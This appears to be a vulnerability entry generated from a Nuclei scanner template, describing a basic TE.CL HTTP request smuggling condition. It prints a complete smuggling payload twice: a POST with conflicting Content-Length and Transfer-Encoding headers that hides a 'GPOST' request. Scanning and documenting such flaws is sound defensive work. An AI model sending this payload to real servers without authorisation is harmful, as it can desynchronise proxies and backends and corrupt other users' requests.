# Vulnerability: Basic TE.CL - HTTP Request Smuggling
**Classification:** TE-CL
**Source:** Nuclei Template (`te-cl-http-smuggling.yaml`)

## Description
Detected a potential TE.CL request smuggling condition where an injected Transfer-Encoding header conflicted with an existing Content-Length header, causing differing parsing behavior between proxy and backend.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

